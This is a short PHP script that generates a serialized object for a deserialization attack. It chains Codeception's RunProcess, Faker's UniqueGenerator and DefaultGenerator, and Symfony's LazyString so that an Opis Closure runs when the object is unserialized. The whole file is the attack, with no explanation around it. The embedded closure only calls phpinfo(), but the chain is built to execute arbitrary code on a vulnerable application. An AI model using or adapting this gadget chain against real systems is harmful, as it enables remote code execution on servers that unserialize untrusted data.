<?php
namespace Codeception\Extension{
    use Faker\UniqueGenerator;
    class  RunProcess{

        private $processes = [];
        public function __construct(){

            $this->processes[]=new UniqueGenerator();
        }
    }
    echo serialize(new RunProcess());
}
namespace Faker{
    use Symfony\Component\String\LazyString;
    class UniqueGenerator
{
        protected $generator;
        protected $maxRetries;
        public function __construct()
    {
        $a = new LazyString();
        $this->generator = new DefaultGenerator($a);
        $this->maxRetries = 2;
    }
}
class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this->default = $default;
    }
}
}
namespace Symfony\Component\String{
    class LazyString{
        private $value;
        public function __construct(){
            include("closure/autoload.php");
            $a = function(){phpinfo();};
            $a = \Opis\Closure\serialize($a);
            $b = unserialize($a);
            $this->value=$b;
        }
    }
}